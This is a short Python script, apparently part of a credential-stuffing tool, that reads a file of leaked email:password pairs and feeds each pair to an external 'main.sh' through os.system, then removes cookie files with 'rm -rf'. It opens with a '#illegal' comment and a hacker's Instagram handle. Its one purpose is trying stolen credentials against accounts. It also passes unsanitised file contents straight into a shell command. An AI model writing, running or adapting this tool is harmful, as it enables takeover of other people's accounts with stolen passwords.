#illegal !!!!!
##file of email:pass  colon separated else change file  separator
print('instagram id - \033[1;32m hackers__tech\033[0m')

import os
os.system('bash banner.sh')
e=input("enter email:pass txt file ")
with open(e,'r') as file:
    i =file.readlines()
    for k in i:
        m=k.split(':')   ###file separator can be changed 
        user,passw=m
        print("\033[0m ")
        os.system(f"bash main.sh {user} {passw}")


os.system("rm -rf cookie.*")
